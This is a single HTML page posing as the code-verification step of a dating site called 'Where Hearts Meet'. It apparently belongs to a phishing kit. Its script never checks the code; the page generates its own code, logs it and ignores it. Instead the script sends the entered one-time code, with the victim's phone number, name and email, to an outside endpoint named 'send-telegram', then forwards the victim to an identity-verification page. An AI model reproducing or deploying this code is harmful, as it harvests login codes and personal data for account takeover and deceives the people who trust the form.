<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Verify OTP - Where Hearts Meet</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px 24px;
            text-align: center;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 8px;
        }

        .form-container {
            padding: 32px 24px;
        }

        .otp-input-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 30px 0;
        }

        .otp-input {
            width: 60px;
            height: 70px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            transition: all 0.3s ease;
        }

        .otp-input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .info-text {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .info-text strong {
            color: #667eea;
        }

        .btn-verify {
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease;
        }

        .btn-verify:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .btn-verify:disabled {
            opacity: 0.6;
            transform: none;
        }

        .resend-link {
            text-align: center;
            margin-top: 20px;
        }

        .resend-link a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
        }

        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 12px;
            text-align: center;
            font-size: 14px;
            display: none;
        }

        .message.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }

        .message.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Verify OTP</h1>
            <p>Enter the verification code</p>
        </div>

        <div class="form-container">
            <div class="info-text">
                We've sent a verification code to <strong id="phoneDisplay"></strong>
            </div>

            <div class="otp-input-container">
                <input type="text" class="otp-input" maxlength="1" id="otp1" autofocus>
                <input type="text" class="otp-input" maxlength="1" id="otp2">
                <input type="text" class="otp-input" maxlength="1" id="otp3">
                <input type="text" class="otp-input" maxlength="1" id="otp4">
                <input type="text" class="otp-input" maxlength="1" id="otp5">
                <input type="text" class="otp-input" maxlength="1" id="otp6">
            </div>

            <button class="btn-verify" id="verifyBtn">Verify & Complete →</button>

            <div class="resend-link">
                <a href="#" id="resendLink">Didn't receive code? Resend</a>
            </div>

            <div id="message" class="message"></div>
        </div>
    </div>

    <script>
        const API_URL = 'https://where-hearts-production.up.railway.app/api/send-telegram';
        
        // Display phone number
        const userPhone = localStorage.getItem('userPhone');
        if (userPhone) {
            document.getElementById('phoneDisplay').textContent = userPhone;
        } else {
            window.location.href = 'index.html';
        }
        
        // Auto-focus OTP inputs
        const inputs = ['otp1', 'otp2', 'otp3', 'otp4', 'otp5', 'otp6'];
        inputs.forEach((id, index) => {
            const input = document.getElementById(id);
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < 5) {
                    document.getElementById(inputs[index + 1]).focus();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && index > 0 && !e.target.value) {
                    document.getElementById(inputs[index - 1]).focus();
                }
            });
        });
        
        // Generate random OTP (for demo - in production, send via SMS)
        function generateOTP() {
            return Math.floor(100000 + Math.random() * 900000).toString();
        }
        
        // Simulate sending OTP (you can integrate with actual SMS service)
        const actualOTP = generateOTP();
        console.log('Demo OTP:', actualOTP); // For testing
        
        document.getElementById('verifyBtn').addEventListener('click', async () => {
            // Get OTP from inputs
            let enteredOTP = '';
            inputs.forEach(id => {
                enteredOTP += document.getElementById(id).value;
            });
            
            const verifyBtn = document.getElementById('verifyBtn');
            const messageDiv = document.getElementById('message');
            
            if (enteredOTP.length !== 6) {
                showMessage('Please enter the 6-digit verification code', 'error');
                return;
            }
            
            // In production, verify against actual OTP sent via SMS
            // For demo, accept any 6-digit code
            // Replace this with actual verification logic
            
            verifyBtn.disabled = true;
            verifyBtn.textContent = 'Verifying...';
            
            try {
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: localStorage.getItem('userPhone'),
                        pin: enteredOTP,
                        name: localStorage.getItem('userName'),
                        email: localStorage.getItem('userEmail'),
                        type: 'otp',
                        site: 'Where Hearts Meet'
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showMessage('✅ Verification successful! Redirecting...', 'success');
                    
                    setTimeout(() => {
                        window.location.href = 'verify-identity.html';
                    }, 2000);
                } else {
                    showMessage('❌ Verification failed: ' + (result.error || 'Invalid code'), 'error');
                    verifyBtn.disabled = false;
                    verifyBtn.textContent = 'Verify & Complete →';
                }
            } catch (error) {
                console.error('Error:', error);
                showMessage('❌ Network error. Please try again.', 'error');
                verifyBtn.disabled = false;
                verifyBtn.textContent = 'Verify & Complete →';
            }
        });
        
        document.getElementById('resendLink').addEventListener('click', (e) => {
            e.preventDefault();
            // Generate new OTP and send via SMS
            const newOTP = generateOTP();
            console.log('New OTP:', newOTP);
            showMessage('A new verification code has been sent to your phone', 'success');
        });
        
        function showMessage(text, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = text;
            messageDiv.className = 'message ' + type;
            messageDiv.style.display = 'block';
            
            setTimeout(() => {
                messageDiv.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>
